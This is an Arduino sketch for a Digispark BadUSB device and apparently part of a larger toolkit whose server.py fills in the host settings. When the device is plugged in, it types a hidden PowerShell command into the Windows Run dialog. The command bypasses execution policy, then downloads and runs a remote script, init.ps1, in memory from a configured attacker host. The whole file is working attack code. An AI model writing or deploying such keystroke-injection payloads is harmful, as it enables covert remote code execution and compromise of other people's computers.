#include "DigiKeyboard.h"

// ── CONFIG ──────────────────────────────────────────────
#define LHOST     ""  // auto-patched by server.py
#define HTTP_PORT ""  // auto-patched by server.py
#define PROTO     ""  // auto-patched by server.py
#define AUTH      "Basic "  // auto-patched by server.py
// ────────────────────────────────────────────────────────

void loop() {

  DigiKeyboard.delay(2000);

  // Open Run, download and execute init.ps1 in memory
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -w hidden -ep bypass -c \"$w=New-Object Net.WebClient;$w.Headers.Add('Authorization','" AUTH "');IEX($w.DownloadString('" PROTO "://" LHOST ":" HTTP_PORT "/moduls/init.ps1'))\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) { /*halt*/ }
}

void setup() {}
